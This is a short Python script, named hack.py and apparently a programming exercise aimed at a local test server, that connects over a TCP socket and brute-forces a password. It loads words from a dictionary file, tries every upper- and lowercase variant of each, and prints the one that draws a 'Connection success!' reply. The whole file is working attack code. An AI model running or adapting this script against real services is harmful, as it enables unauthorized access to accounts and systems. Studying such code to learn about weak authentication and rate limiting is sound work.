import socket
import argparse
import itertools


def bruteforce(client_socket):
    passwords = load_passwords()

    for password in passwords:
        password_iter = map(''.join, itertools.product(*zip(password.lower(), password.upper())))
        for pwd in password_iter:
            client_socket.send(pwd.encode())
            response = client_socket.recv(10240)
            response = response.decode()

            if response == "Connection success!":
                client_socket.close()
                print(pwd)
                return

def connection(hostname, port):
    with socket.socket() as client_socket:
        address = (hostname, port)

        client_socket.connect(address)
        bruteforce(client_socket)

def load_passwords():
    with open("passwords.txt", "r") as file:
        passwords = [line.strip() for line in file]
    return passwords

# python hack.py localhost 9090
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "hostname",
        type=str
    )
    parser.add_argument(
        "port",
        type=int
    )

    args = parser.parse_args()
    connection(args.hostname, args.port)


if __name__ == "__main__":
    main()
